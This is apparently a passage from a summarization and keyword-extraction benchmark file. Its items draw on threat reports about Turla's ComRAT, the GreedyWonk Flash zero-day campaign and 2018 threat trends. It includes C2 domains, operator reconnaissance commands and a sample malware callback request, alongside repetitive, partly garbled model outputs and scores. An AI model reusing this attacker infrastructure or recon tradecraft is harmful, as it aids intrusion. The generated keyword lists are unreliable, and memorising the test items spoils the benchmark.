uk/static-assets/documents/Turla%20group%20using %20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1 pdf2223Schlee, M. (2018, 03 06). Hackers used Outlook for cyberattack on German government: report. Retrieved from url politico eu/article/report-hackers-used-outlook-for-cyberattack-on-german-government/Shevchenko, S. (2008, 11). Agent.btz - A Threat That Hit Pentagon. Retrieved from url threatexpert com/2008/11/agentbtz-threat-that-hit-pentagon html24 Tanase, S. (2015, 09 09). Satellite Turla: APT Command and Control in the Sky. Retrieved fromurl com/satellite-turla-apt-command-and-control-in-the-sky/72081/25 Untersinger, M. (2019, 01 29). Quelle est la bonne \u00e9quation pour pacifier le cyberespace ? (Le Monde2019)Retrieved from url lemonde fr/pixels/article/2019/01/29/course-aux-cyberarmes-logiciels-destructeurs-dormants-le-difficile- apaisement-du-cyberespace_5416003_4408996 html26 Wikipedia. (n.d.). Abstract factory pattern. Retrieved 03 17, 2020, fromurl wikipedia org/wiki/Abstract_factory_pattern27 Wikipedia. (n.d.). Adapter pattern. Retrieved 03 17, 2020, fromurl wikipedia org/wiki/Adapter_pattern28 Wikipedia. (n.d.). Mediator pattern. Retrieved 03 17, 2020, fromurl wikipedia org/wiki/Mediator_pattern237.INDICATORS OF COMPROMISE7.1 HashesSHA-1 ComRAT orchestratorESET detection name PowerShell/Turla.X Win64/Turla.BY Win64/Turla.AP Win32/Turla.EI7.2 Paths%TEMP%\\FXSAPIDebugTrace.txt %TEMP%\\iecache.bin7.3 Windows registry(HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\ {59031A47-3F72-44A7-80C5-5595FE6B30EE} HKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows.WSqmCons7.4 Network foods.jkub[.]com progress.zyns[.]com scrabble.ikwb[.]com wekanda[.]tk248. MITRE ATT&CK TECHNIQUES T1086PersistenceT1053Scheduled TaskT1027Obfuscated Files or InformationT1055Process InjectionT1112Modify RegistryDescription A PowerShell script is used to install ComRAT. ComRAT uses a scheduled task to launch its PowerShell loader. The ComRAT orchestrator is stored encrypted and only decrypted at execution. The ComRAT orchestrator is injected into explorer.exe. The communication DLL is injected into the default browser. The ComRAT orchestrator is stored encrypted in the registry.Defense EvasionDiscoveryCollectionCommand and ControlExfiltrationT1016T1033T1069T1082Operators execute ipconfig and nbstat.System Network Configuration Discovery System Owner/User Discovery Permission Groups Discovery Operators execute net group /domain. System Information DiscoveryOperators execute systeminfo.Operators execute net user.T1083File and Directory DiscoveryT1087T1120T1135T1213T1024T1043T1071T1102 T1002 T1022T1048Account DiscoveryPeripheral Device DiscoveryNetwork Share Discovery Data from Information Commonly Used Port Alternative ProtocolOperators list the content of several directories. Example: dir /og-d \u201c%userprofile%\\AppData\\ Roaming\\Microsoft\\Windows\\Recent\\*.*\u201d. Operators execute net user and net group. Operators execute fsutil fsinfo drives to list the connected drives. Operators execute net view. The Operators use a custom tool to exfiltrate documents from an internal central database.ComRAT uses RSA and AES to encrypt C&C data.ComRAT uses ports 80 and 443.ComRAT uses HTTP and HTTPS.ComRAT can be controlled via the Gmail web UI. The documents are compressed in a RAR archive. The RAR archive is encrypted with a password. Data is exfiltrated to cloud storage, mounted locally using the net use command. ", "generated_text": "the document; the Operational Security Kit; ComRAT; Snake; at least 2007; at least 20 years; their operations; Europe; Central Asia; the Middle East; the group; high-profile targets; the US Department of Defense; the Swiss defense company; 2014; the German Foreign Office; 2017; the French Armed Forces; 2018; 2019; the German Foreign Ministry; the attackers; PowerStallion PowerShell backdoor; tools; pivoting; network; the group; options; the PowerShell backdoor; the PowerStallion v3 backdoor; access; HTTP; PowerStallion PowerShell backdoor; the PowerStallion PowerShell; The C&C; the PowerStallion PowerShell; commands; exfiltrating data; the Exchange server; a rootkit; a custom backdoor; Windows; a PowerShell backdoor; features; a multi-factor authentication; the backdoor; a network; Windows XP; Custom Messages; custom folders; other backdoors; a GET; a custom certificate; a custom SIG; the backdoor; the ESET research team;", "ref_text": "<START-1>The report by ESET analyzes the evolution of a sophisticated malware family called ComRAT, used by the cyberespionage group Turla (also known as Snake). Turla has been active for over 10 years targeting high-profile organizations like governments and militaries in Europe, Central Asia, and the Middle East. ComRAT originated as the malware Agent.BTZ which was involved in a 2008 breach of the US military. It has gone through several iterations over the years, with version 4 released around 2017 being a complete code rewrite. ComRAT v4 uses complex features like a virtual FAT16 file system to store its configuration and modules. It has two command and control channels - one using HTTP like older versions, and one newly added that utilizes the Gmail web interface to send commands and exfiltrate data. ESET has identified at least 3 targets of ComRAT v4 - two foreign ministries and one national parliament. It is used to gather sensitive documents which are compressed and exfiltrated via public cloud storage services. ComRAT v4 is attributed to Turla based on victimology, shared code, and infrastructure links to other Turla tools. It is still in use as of early 2020, showing the group's continued development. The report concludes that Turla remains a highly capable threat actor through long-term use and constant evolution of advanced malware like ComRAT. <END-1>", "t5/keyword/hint_hit_precision": 0.19298245614035087, "t5/word/hint_hit_recall": 0.06818181818181818, "gpt3/lexical/rouge_rouge1": 0.4947368421052632, "gpt3/lexical/rouge_rouge2": 0.17989417989417988, "gpt3/lexical/rouge_rougeL": 0.3263157894736842, "gpt3/lexical/rouge_rougeLsum": 0.3263157894736842, "gpt3_generated_text": ["The ESET Research White Paper delves into the extensive history and operations of the cyberespionage group known as Turla, also referred to as Snake. Since at least 2007, Turla has been targeting high-profile entities in Europe, Central Asia, and the Middle East, including the US Department of Defense and the Swiss defense company in 2014. The group's sophisticated attack methods involve a variety of custom tools, such as the ComRAT backdoor, which has been in use for at least 20 years. ComRAT, a complex C++ backdoor, utilizes a Virtual File System formatted in FAT16 and is deployed through various access methods, including the PowerStallion PowerShell backdoor. The backdoor has two Command and Control channels - HTTP and email - allowing the attackers to execute commands and exfiltrate data. The ESET research team provides detailed insights into the features and capabilities of ComRAT, shedding light on the group's advanced cyber capabilities and their continued threat to organizations worldwide."]}, {"split_name": "val", "sample_id": "val_12", "prompt_text": "Extract the keywords: Operation GreedyWonk: Multiple Economic and Foreign Policy Sites Compromised, Serving Up Flash Zero-Day ExploitLess than a week after uncovering Operation SnowMan, the FireEye Dynamic Threat Intelligence cloud has identified another targeted attack campaign \u2014 this one exploiting a zero-day vulnerability in Flash. We are collaborating with Adobe security on this issue. Adobe has assigned the CVE identifier CVE-2014- 0502 to this vulnerability and released a security bulletin.As of this blog post, visitors to at least three nonprofit institutions \u2014 two of which focus on matters of national security and public policy \u2014 were redirected to an exploit server hosting the zero-day exploit. We\u2019re dubbing this attack \u201cOperation GreedyWonk.\u201dWe believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer, based on consistencies in tradecraft (particularly with the websites chosen for this strategic Web compromise), attack infrastructure, and malware configuration properties.The group behind this campaign appears to have sufficient resources (such as access to zero-day exploits) and a determination to infect visitors to foreign and public policy websites. The threat actors likely sought to infect users to these sites for follow-on data theft, including information related to defense and public policy matters.DiscoveryOn Feb. 13, FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash (www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe.We subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server. All three organizations are nonprofit institutions; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues.MitigationTo bypass Windows\u2019 Address Space Layout Randomization (ASLR) protections, this exploit targets computers with any of the following configurations:Windows XP Windows 7 and Java 1.6Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010Users can mitigate the threat by upgrading from Windows XP and updating Java and Office. If you have Java 1.6, update Java to the latest 1.7 version. If you are using an out-of-date Microsoft Office 2007 or 2010, update Microsoft Office to the latest version.These mitigations do not patch the underlying vulnerability. But by breaking the exploit\u2019s ASLR-bypass measures, they do prevent the current in-the-wild exploit from functioning.Vulnerability analysisGreedyWonk targets a previously unknown vulnerability in Adobe Flash. The vulnerability permits an attacker to overwrite the vftable pointer of a Flash object to redirect code execution.ASLR bypassThe attack uses only known ASLR bypasses. Details of these techniques are available from our previous blog post on the subject (in the \u201cNon-ASLR modules\u201d section).For Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C runtime) gadgets with hard-coded base addresses for English (\u201cen\u201d) and Chinese (\u201czh-cn\u201d and \u201czh-tw\u201d).On Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the user has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has Microsoft Office 2007 or 2010.Java 1.6 is no longer supported and does not receive security updates. In addition to the MSVCR71.dll ASLR bypass, a variety of widely exploited code-execution vulnerabilities exist in Java 1.6. That\u2019s why FireEye strongly recommends upgrading to Java 1.7.The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013. More details about this bypass are addressed by Microsoft\u2019s Security Bulletin MS13-106 and an accompanying blog entry. FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches.Shellcode analysisThe shellcode is downloaded in ActionScript as a GIF image. Once ROP marks the shellcode as executable using Windows\u2019 VirtualProtect function, it downloads an executable via the InternetOpenURLA and InternetReadFile functions. Then it writes the file to disk with CreateFileA and WriteFile functions. Finally, it runs the file using the WinExec function.PlugX/Kaba payload analysisOnce the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash compiled on Feb. 12, one day before we first observed it, indicating that it was deployed specifically for this campaign.This PlugX payload was configured with the following command-and-control (CnC) domains:java.ns1[.]name adservice.no-ip[.]org wmi.ns01[.]usSample callback traffic was as follows:POST /D28419029043311C6F8BF9F5 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; SV1) Host: java.ns1.name Content-Length: 0 Connection: Keep-Alive First Seen adservice.no-ip[.]org 2014-02-18 2014-02-18 java.ns1[.]name 2014-02-18 java.ns1[.]name 2014-02-17 wmi.ns01[.]us proxy.ddns[.]info 2013-05-02Last Seen 2014-02-19 2014-02-19 2014-02-18 2014-02-17 2014-02-18IP Address updatedns.ns01[.]us 2013-09-06 wmi.ns01[.]us 2013-07-042013-09-06 2013-09-06 2012-06-09 fuckchina.govnb[.]com 2010-03-15 microsafes.no-ip[.]org Domain fuckchina.govnb[.]com 2013-12-11 microsafes.no-ip[.]org 2014-02-12 microsafes.no-ip[.]org 2013-12-04Last Seen 2013-12-11 2014-02-12 2013-12-04IP Address configuration properties:MD5 password, which was dropped by an Adobe Flash exploit (CVE-2012-0779). In this previous incident, visitors to the Center for Defense Information website (www.cdi[.]org \u2014 also an organization involved in to using the same password \u201cjava7,\u201d this variant was configured with the mutex with the similar pattern of \u201cYFds*&^ff\u201d and connected to a CnC server at windows.ddns[.]us.Using passive DNS analysis, we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to wmi.ns01.us windows.ddns.usFirst Seen 2012-07-07 2012-05-23Last Seen 2012-09-19 2012-06-10IP Address variant connected to a CnC server at ids.ns01[.]us. The domain ids.ns01[.]us also overlaps with the wmi.ns01[.]us ids.ns01[.]usFirst Seen 2012-07-03 2012-04-23Last Seen 2012-07-04 2012-05-18IP Address an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be). In this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be.In what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the current Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013.ConclusionThis threat actor clearly seeks out and compromises websites of organizations related to international security policy, defense topics, and other non-profit sociocultural issues. The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically.This actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a variety of malware families on compromised systems. Based on these and other observations, we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid- term. ", "generated_text": "Operation GreedyWonk; Flash; visitors; nonprofit institutions; media; foreign policy websites; a zero-day vulnerability; the Flash; the attackers; an attacker; overwrite; the vftable pointer; a Flash object; redirect code execution; the vftable pointer; a Flash object; the exploit; ASLR protections; foreign and public policy websites; the threat actors; infrastructure; data theft; defense; public policy matters.", "ref_text": "<START-1>The document describes an attack campaign dubbed \"Operation GreedyWonk\" that was discovered in February 2014. The campaign involved compromising multiple websites related to economic policy, foreign affairs, and national security. Visitors to these compromised sites were redirected to an exploit server hosting a zero-day Flash exploit (CVE-2014-0502). The goal was to infect visitors, especially those interested in defense and public policy matters, with malware for follow-on data theft. The exploit bypassed Windows ASLR protections by targeting systems still running Windows XP or having outdated Java and Microsoft Office. Once the exploit succeeded, it installed a remote access trojan called PlugX/Kaba. This malware variant was compiled shortly before discovery, indicating it was specifically built for this campaign. Researchers believe GreedyWonk may be connected to an earlier 2012 campaign that used similar tradecraft and infrastructure. Malware samples from both campaigns connected to overlapping domains that previously resolved to the same IP addresses. The group behind the campaigns appears sufficiently resourced to access zero-days and remains a credible threat. The report highlights the actor's persistence in compromising policy and defense-related websites, early access to exploits, ability to re-compromise sites, and deployment of various malware families. This demonstrates an adversary with mature capabilities that continues to pose a threat through strategic web compromises to infect visitors from specific communities. <END-1>", "t5/keyword/hint_hit_precision": 0.375, "t5/word/hint_hit_recall": 0.06976744186046512, "gpt3/lexical/rouge_rouge1": 0.4502923976608187, "gpt3/lexical/rouge_rouge2": 0.16470588235294117, "gpt3/lexical/rouge_rougeL": 0.25146198830409355, "gpt3/lexical/rouge_rougeLsum": 0.25146198830409355, "gpt3_generated_text": ["Operation GreedyWonk is a targeted attack campaign exploiting a zero-day vulnerability in Adobe Flash. Nonprofit institutions, particularly those focusing on national security and public policy, were compromised, redirecting visitors to an exploit server hosting the zero-day exploit. The attackers were determined to infect users for data theft related to defense and public policy matters. The exploit targets computers with specific configurations to bypass Windows' ASLR protections. Mitigations include updating Java and Microsoft Office to prevent the exploit from functioning. The vulnerability allows attackers to overwrite the vftable pointer of a Flash object to redirect code execution. The shellcode is downloaded as a GIF image and, once executed, downloads and runs a PlugX/Kaba remote access payload."]}, {"split_name": "val", "sample_id": "val_13", "prompt_text": "Extract the keywords:  A blend of old and new cybersecurity issues inundated enterprises in 2018. Researchers discovered that nearly all running computers had serious hardware flaws, the ransomware problem persisted, unauthorized cryptocurrency mining spread and diversified, and vulnerable connected devices in homes were hit with effective new attacks. Also, in reaction to a broadening landscape of operating systems and devices, cybercriminals shifted from exploit kit-based attacks to an old but still effectual tactic: social engineering. Exploit kits and automated methods were efficient when a large number of users were using vulnerable software, but in 2018 many threat actors were trying to exploit human vulnerabilities instead. Our annual security roundup examines these and other important security issues, providing valuable insight for enterprises and users to help them be aware of and prepared for critical threats. As a means for important communications to and from an enterprise\u2019s network, business email makes for an attractive platform for cybercriminals. Consequently, phishing and other social engineering schemes are among the top concerns for cybersecurity professionals, as unwanted emails designed and worded professionally can easily fool a recipient who regularly fields similar emails. In 2018, we saw an increase in the use of various forms of messaging threats. Most notably, we observed an 82-percent increase in blocked access to phishing URLs by unique client IP address compared to the previous year. Phishing traditionally arrives via email since email-based threats are much more platform-agnostic than other types of attacks that rely, for instance, on specific exploits. Year-on-year comparison of blocked access to phishing URLs by unique client IP address (e.g., one machine that accessed a link three times was counted as one) Recently, apart from emails, there have also been phishing attacks that use chat, SMS, and other communication modes. The increase in numbers as well as different versions of phishing attacks shows how cybercriminals are adapting to a changing landscape. More connected devices and a widening range of operating systems mean that exploiting one particular operating system will not be as profitable for cybercriminals as in the past. Consequently, they are turning to an old but still usually effective attack. Another form of messaging attacks that picked up pace in 2018 was business email compromise (BEC). In a typical BEC attack, an attacker initiates or intercepts communications to con an enterprise employee who has the power to release or transfer funds. Managing Director/Director President General Manager/Manager Top positions being spoofed While the overall number of these BEC attacks was low, a successful attempt could result in high financial losses for the target company. By contrast, phishing attacks were widely launched against a number of possible victims because duping even a low percentage of users would be profitable for attackers. Overall ransomware-related threats decreased by 91 percent from 2017 to 2018, and the number of discovered ransomware families also dropped over the same period. This steep and steady decline continued the trajectory we noted in our midyear roundup report. It could be attributed to improved ransomware solutions, growing awareness of the threat, and to a certain extent, the realization that negotiating with attackers would prove futile. Ransomware-related threats New ransomware families Nevertheless, since the profit that attackers stood to gain outweighed the effort involved in launching attacks, we continued to see ransomware being used. Our detections for WannaCry, the family that caused the infamous ransomware outbreak of May 2017, were at a stable number (616,399) and overshadowed those for all other ransomware families by a wide margin. Cryptocurrency mining, for its part, reached a new peak in 2018 at over 1.3 million detections \u2014 a 237-percent growth from the previous year. Cryptocurrency mining detections Apart from the rise in detections, we also observed a \u201cgold rush\u201d in cryptocurrency-mining attack methods throughout the year: penetrating ad platforms, popup ads, a malicious browser extension, mobile phones, botnets, bundling with legitimate software, exploit kits, and repurposed ransomware. in fileless threats Aug 2017 - Dec 2018 There was also an upsurge in one of the attack methods used to evade traditional blacklisting techniques: fileless threats. These particular threats attempt to evade conventional solutions and can usually be detected only via other means such as traffic monitoring, behavioral indicators, or sandboxing. The year in security began with the groundbreaking disclosure of Meltdown and Spectre, processor-level vulnerabilities that relied on flaws in the speculative execution of CPU instructions. These new classes of flaws affected different microprocessors and spawned new CPU attacks as well as a slew of mitigation troubles. And even by the end of the year, there was no straightforward solution for these micro-architectural weaknesses. Another unfortunate first in 2018 was the discovery of a critical vulnerability in the open-source cloud orchestration software Kubernetes. Fortunately, this particular flaw was quickly patched. Most vulnerabilities are found and then responsibly disclosed by security researchers and vendors so that they cannot be used in any widespread attacks. But disclosing a vulnerability to the public also means alerting threat actors to it, so creating a fix before information is released is vital. Threat actors actively abuse vulnerabilities to create operational exploits. Recently, no widespread zero-day exploit attacks were identified, unlike in the past, when two or three major zero-day attacks would define a year. Rather, the attacks that were discovered in 2018 were of limited scope. Cybercriminals were also abusing vulnerabilities that had already been patched, banking on the assumption that many users did not speedily apply the available fixes, if at all. *Hover to flip to the attack date Drupal vulnerability used to deliver cryptocurrency miners CVE-2018-7602 PATCH DATE: April 25, 2018 ATTACK DATE: 5 hours after release of patch Apache CouchDB vulnerabilities used to deliver cryptocurrency miners CVE-2017-12635, CVE-2017-12636 PATCH DATE: Nov. 14, 2017 ATTACK DATE: Feb. 15, 2018 3 months later Oracle WebLogic WLS-WSAT vulnerability used for cryptocurrency mining CVE-2017-10271 PATCH DATE: Oct. 16, 2017 ATTACK DATE: Feb. 26, 2018 4 months later Vulnerability that allows permanent rooting of Android phones used in AndroRat CVE-2015-1805 PATCH DATE: March 16, 2016 ATTACK DATE: Feb. 13, 2018 23 months later Notable attacks in 2018 involving exploits for known and patched vulnerabilities Of the vulnerabilities found in 2018, a considerable percentage was for software used in industrial control systems (ICSs). And most of those vulnerabilities were in human-machine interface (HMI) software for ICSs and supervisory control and data acquisition (SCADA) environments. The HMI is the main hub for monitoring, managing, and implementing the states of different processes in facilities. Exploiting a critical HMI vulnerability could allow an attacker to affect the functionality of the physical components of an enterprise facility. Router-based attacks continued unabated despite the repercussions faced by the creators of Mirai and Satori. In 2018, we found that recycled Mirai code was still being used against routers. And VPNFilter, another form of router malware, was updated with added capabilities, such as reconnaissance and persistence components, that led to the abuse of routers beyond distributed denial of service (DDoS). We also found routers being used in cryptocurrency mining and pharming attacks, which continued the trend of increased functionalities we noted in our midyear roundup report. There were two examples of attack incidents in 2018: malware-monero-mining-icon-roundup CRYPTOJACKING Attackers exploited a patched security flaw in MikroTik routers in Brazil and injected malicious Coinhive script to mine Monero. maliciouspage-icon-roundup MALICIOUS REDIRECTION The exploit kit Novidade could change router Domain Name System (DNS) settings so that an unsuspecting user could be redirected to fake pages controlled by the attacker. As more smart devices are getting connected to the internet of things (IoT), more home owners are effectively becoming \u201csmart home network administrators.\u201d As such, they must take on the responsibility of making sure that their routers do not become an entry point for attackers. Since routers function as the main hub for managing connections to and from the different devices that need the internet, it is critical that they are secured. Trend Micro Research Machine Learning Solutions ahead-of-the-curve-pdf-thumb Ahead of the Curve: A Deeper Understanding of Network Threats Through Machine Learning adversarial-sample-generation-making-machine-learning-systems-robust-for-security-cover Adversarial Sample Generation: Making Machine Learning Systems Robust for Security uncovering-unknown-threats-with-human-readable-machine-learning-cover Uncovering Unknown Threats With Human-Readable Machine Learning Connected Hospitals, Energy Providers, Water Companies exposed-and-vulnerable-critical-infrastructure-the-water-energy-industries-pdf-thumb Exposed and Vulnerable Critical Infrastructure: Water and Energy Industries mqtt-and-coap-security-and-privacy-issues-in-iot-and-iiot-communication-protocols-cover The Fragility of Industrial IoT\u2019s Data Backbone securing-connected-hospitals-ai Securing Connected Hospitals: A Research on Exposed Medical Systems and Supply Chain Risks Cybercriminal Investigations and Takedowns rise-and-fall-of-scan4you-pdf-cover The Rise and Fall of Scan4You The-Evolution-of-Cybercrime-and-Cyberdefense-cover The Evolution of Cybercrime and Cyberdefense OVERALL THREATS BLOCKED IN 2018 Threat components blocked\t1H 2018\t2H 2018\t2018 total Email threats\t16,997,711,547\t24,521,948,297\t41,519,659,844 Malicious files\t2,956,153,112\t2,867,738,653\t5,823,891,765 Malicious URLs\t534,534,550\t509,064,959\t1,043,599,509 Overall threats\t20,488,399,209\t27,898,751,909\t48,387,151,118 Half-year comparison of blocked email, file, and URL threats Year\tWannaCry family\tOther ransomware families 2017\t321,814\t244,716 2018\t616,399\t126,518 Year-on-year comparison of WannaCry detections versus other ransomware detections combined Monthly comparison of fileless threat detections 147%33%35%38%94%27% Year-on-year comparison of vulnerabilities of selected software vendors For more insight into the most important cybersecurity issues of 2018, download our annual security roundup. ", "generated_text": "2018; organizations; ransomware; unauthorized cryptocurrency mining; 2018; phishing attacks; use; botnets; ad campaigns; popup ads; use; ad threats; Spectre; Meltdown; Spectre; Malware; Meltdown; Spectre; Spectre; Spectre; a blend; old; 2018; threats; virtual devices; devices; applications; devices; attacks; new threat actors; the ransomware problem; products; social engineering; cybercriminals; malicious emails; malware; tools; programs; the threat; unauthorized cryptocurrency mining.", "ref_text": "<START-1>The document provides an overview of major cybersecurity threats and issues in 2018. Messaging threats like phishing increased, with an 82% rise in blocked phishing URLs. Business email compromise attacks also grew targeting enterprise employees. Ransomware declined significantly, with detections down 91% and fewer new families, though WannaCry remained prevalent. Cryptocurrency mining detections grew 237%. Fileless threats that evade traditional antivirus rose 819%. Major hardware vulnerabilities like Meltdown and Spectre were disclosed. Attacks exploited known vulnerabilities for cryptocurrency mining rather than zero-days. Many critical flaws were found in industrial and IoT systems. Router malware continued via recycled Mirai code and new threats like VPNFilter. IoT devices were abused for cryptomining and pharming. As homes add more smart devices, routers become a key attack vector. Trend Micro research covered areas like machine learning for security, critical infrastructure risks, cybercriminal takedowns, and threat evolution. In 2018, over 48 billion threats were blocked, mostly email threats. WannaCry dominated ransomware while other families declined. The report highlights key issues like social engineering, hardware flaws, IoT threats, messaging attacks, and ransomware. It provides data on threat trends and research insights for enterprises to be aware of latest risks. <END-1>", "t5/keyword/hint_hit_precision": 0.25, "t5/word/hint_hit_recall": 0.05699481865284974, "gpt3/lexical/rouge_rouge1": 0.3987341772151899, "gpt3/lexical/rouge_rouge2": 0.12101910828025478, "gpt3/lexical/rouge_rougeL": 0.2151898734177215, "gpt3/lexical/rouge_rougeLsum": 0.2151898734177215, "gpt3_generated_text": ["In 2018, organizations faced a blend of old and new cybersecurity threats. Ransomware and unauthorized cryptocurrency mining continued to be persistent issues, while phishing attacks evolved to include various messaging platforms. Cybercriminals shifted from exploit kits to social engineering tactics, targeting human vulnerabilities. Business email compromise (BEC) attacks targeted high-ranking employees, posing significant financial risks. Despite a 91% decrease in ransomware-related threats, attacks like WannaCry remained prevalent. Cryptocurrency mining saw a 237% growth, utilizing various attack methods including fileless threats. The year also saw the disclosure of processor vulnerabilities like Meltdown and Spectre, leading to new CPU attacks and mitigation challenges. Overall, organizations faced a challenging cybersecurity landscape in 2018, emphasizing the importance of preparedness and awareness against evolving threats."]}, {"split_name": "val", "sample_id": "val_14", "prompt_text": "Extract the keywords: Evolution of sophisticated spyware: from Agent.BTZ to ComRATIn November 2014, the experts of the G DATA SecurityLabs published an article about ComRAT, the Agent.BTZ successor. We explained that this case is linked to the Uroburos rootkit. We assume that the actor behind these campaigns uses several different malware strains is order to compromise the targeted infrastructure: Uroburos, a rootkit; Agent.BTZ/ComRAT, remote administration tools or Linux malware and maybe even more.We decided to have an even closer look at Agent.BTZ and ComRAT and therefore analyzed the evolution of this RAT, covering seven years of development. Here is a table with the minimal information about 46 Ch 2.03 Ch 2.03 Ch 2.04 Ch 2.04 Ch 2.04 Ch 2.04 Ch 2.04Version Wed Jun 13 07:31:32 2007 UTC Ch 1.0 Wed Jun 13 07:31:32 2007 UTC Ch 1.0 Wed Jun 13 07:31:32 2007 UTC Ch 1.0 Tue Jun 19 12:41:21 2007 UTC Ch 1.0 Tue Jun 26 08:46:11 2007 UTC Ch 1.1 Ch 1.1 Tue Jun 26 08:46:11 2007 UTC Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC Ch 1.2wcc Tue Jul 24 12:57:37 2007 UTC Thu Jul 26 07:20:17 2007 UTC Ch 1.2 Mon Dec 3 14:15:58 2007 UTC Ch 1.3 Ch 1.4 Tue Dec 11 17:36:03 2007 UTC Tue Dec 11 17:36:03 2007 UTC Ch 1.4 Tue Dec 11 17:36:03 2007 UTC Ch 1.4 Ch 1.5 Thu Mar 27 14:58:15 2008 UTC Thu Mar 27 14:58:15 2008 UTC Ch 1.5 Thu Mar 27 14:58:15 2008 UTC Ch 1.5 Ch 1.5 Thu Mar 27 14:58:15 2008 UTC Mon May 5 11:27:48 2008 UTC Mon May 12 11:52:31 2008 UTC Thu May 22 10:24:55 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTC Mon Jun 9 17:23:56 2008 UTCMon Jun 9 17:23:56 2008 UTC Ch 2.04 Thu Nov 6 13:21:45 2008 UTC Ch 2.05 Thu Nov 6 13:21:45 2008 UTC Ch 2.05 Mon Dec 29 11:37:17 2008 UTC Ch 2.07 Mon Dec 29 11:37:17 2008 UTC Ch 2.07 Mon Sep 14 13:22:57 2009 UTC Ch 2.11 Mon Sep 14 15:28:07 2009 UTC Ch 2.11 Tue Sep 29 10:28:40 2009 UTC Ch 2.12 Mon Dec 7 14:25:12 2009 UTC Ch 2.13 Ch 2.13 Mon Dec 7 14:27:53 2009 UTC Ch 2.14.1 Wed Feb 17 15:14:20 2010 UTC Ch 3.00 Tue Jan 31 16:12:25 2012 UTC Tue Feb 14 10:28:06 2012 UTC Wed Apr 4 16:23:44 2012 UTC Ch 3.02 Ch 3.10 Tue Dec 18 08:22:43 2012 UTC Fri Jun 28 12:16:40 2013 UTC Ch 3.20 Fri Jun 28 12:16:58 2013 UTC Mon Jun 24 10:51:01 2013 UTC Ch 3.20 Thu Feb 6 12:37:44 2014 UTC Ch 3.25 Ch 3.26 Thu Jan 3 18:03:46 2013 UTCThanks to the versioning, we can deduce that the compilation dates we saw and currently see actually seem to be legit \u2013 except for the last known version, in which the author modified the compilation date in order to make the analysis more complex. We can see that this malware was really active in 2007 and 2008. New versions declined in frequency in 2009 and only one new sample was identified in 2010. We did not encounter any new sample from 2011, but the malware appeared back in 2012, with a new major version.The RAT\u2019s evolution described in ten stepsTo describe the evolution of the development, we decided to compare ten major versions:Version Ch 1.0 (2007-06) to Ch 1.5 (2008-03) Version Ch 1.5 (2008-03) to Ch 2.03 (2008-05) Version Ch 2.03 (2008-05) to Ch 2.11 (2009-09) Version Ch 2.11 (2009-09) to Ch 2.14.1 (2010-02) Version Ch 2.14.1 (2010-02) to Ch 3.00 (2012-01) Version Ch 3.00 (2012-01) to Ch 3.10 (2012-12) Version Ch 3.10 (2012-12) to Ch 3.20 (2013-06) Version Ch 3.20 (2013-06) to Ch 3.25 (2014-02) Version Ch 3.25 (2014-02) to Ch 3.26 (2013-01; date has been modified)The following chapter will present the main differences between the versions mentioned above. Here is the resemblance ratio for each version, comparing direct neighbor versions only, created using BinDiff:The biggest code update has occurred between version 2.14.1 and version 3.00. The gap matches the absence of samples during two years and this fundamental modification is what we call the death of Code similarity: 90%We did not identify strong modification between the two samples. However, we can notice the following:The configuration file (XML) in version 1.5 is stored in Unicode and not in ASCII anymore; The two versions implement a mechanism to infect new media connected to the infected system. The implementation is not exactly the same nor is the log of media infection; Code similarity: 83%In version 2.03 of Agent.BTZ, the authors changed the following:They added obfuscation in order to hide sensitive strings; The communication protocol was modified in order to include the flag \u201c<CHCMD>\u201d we assume that \u201cCH\u201d has the same meaning than \u201cCh\u201d before the version number and \u201cCMD\u201d is the abbreviation for command; From now on, the malware supports \u201crunas\u201d in order to execute commands as administrator. This command was implemented by Microsoft in Windows Vista in 2007. We assume that the author implemented this feature because several targets switched to this version of Windows in 2008.According to an article, version 1.5 was used against the US Pentagon. We assume that the string Code similarity: 96%The codes of these two versions are extremely similar to each other, we can only notice small changes:The author changed the name of several registry keys (probably to avoid detection by well-known IOC); The name of two exported functions were modified, too: InstallM() becomes AddAtomT() and Code similarity: 98%These codes are really similar to each other, too. We can notice only two changes:The author patched several bugs; Four new exports appear: DllCanUnLoadNow(), DllGetClassObject(), DllRegisterServer(), DllUnregisterServer().The four exported libraries show that the malware has started to support the OLE Component ObjectModel (COM). This version is the first version able to be registered as a COM object. Three of the four Code similarity: 60%These codes really differ from each other, even if some parts of version 2.14.1 were retained. Moreover, the developers changed the compiler; they switched from Visual Studio 6.0 to Visual Studio 9.0/10.0 , which is a strong indicator for the huge differences.Version 3.00 is what the G DATA SecurityLabs experts call ComRAT. We can say that version 2.14.1 is the last version of Agent.BTZ. Here are the main differences between Agent.BTZ and ComRAT:The new malware collects more information about the infected system (such as drive information, volume information\u2026). The media stick infection mechanism has 